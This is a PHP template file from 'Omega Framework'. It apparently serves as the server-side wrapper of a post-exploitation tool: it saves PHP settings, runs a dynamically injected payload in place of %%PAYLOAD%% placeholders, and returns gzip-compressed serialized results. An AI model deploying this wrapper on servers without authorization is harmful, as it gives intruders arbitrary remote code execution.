<?php

//            ---------------------------------------------------
//                              Omega Framework                                
//            ---------------------------------------------------
//                  Copyright (C) <2020>  <Entynetproject>       
//
//        This program is free software: you can redistribute it and/or modify
//        it under the terms of the GNU General Public License as published by
//        the Free Software Foundation, either version 3 of the License, or
//        any later version.
//
//        This program is distributed in the hope that it will be useful,
//        but WITHOUT ANY WARRANTY; without even the implied warranty of
//        MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
//        GNU General Public License for more details.
//
//        You should have received a copy of the GNU General Public License
//        along with this program.  If not, see <http://www.gnu.org/licenses/>.

// backup php configuration state for later restoration.
$orig_conf = ini_get_all();
foreach ($orig_conf as $key => $val)
{
    if ($val["access"] & 1)
        $orig_conf[$key] = $val["local_value"];
    else
        unset($orig_conf[$key]);
}

// %%PAYLOAD%% is replaced by $PAYLOAD_PREFIX configuration setting.
// This feature allows executing something in php each time the
// payload is executed, because any sent request is encapsulated
// through this file.
%%PAYLOAD_PREFIX%%

// container for dynamic input variables, transmitted from plugins
// at python side (plugin.py files).
$OMEGA = array();

// allows php-side plugins to use `return error("something")`
// with a printf()-like flavour.
// This is the correct way to inform the framework that output
// is an error message.
function error($a='', $b=False, $c=False, $d=False, $e=False)
{
    return (array('__ERROR__' => sprintf($a, $b, $c, $d, $e)));
}

// %%PAYLOAD%% is replaced by the dynamically built payload
// before each remote plugin execution.
function payload()
{
    %%PAYLOAD%%
}

// handle payload result and output it's gzipped content.
$result = payload();
if (@array_keys($result) !== array('__ERROR__'))
    $result = array('__RESULT__' => $result);
echo gzcompress(serialize($result));

// restore backed php configuration state.
foreach ($orig_conf as $key => $val)
    @ini_set($key, $val);

?>
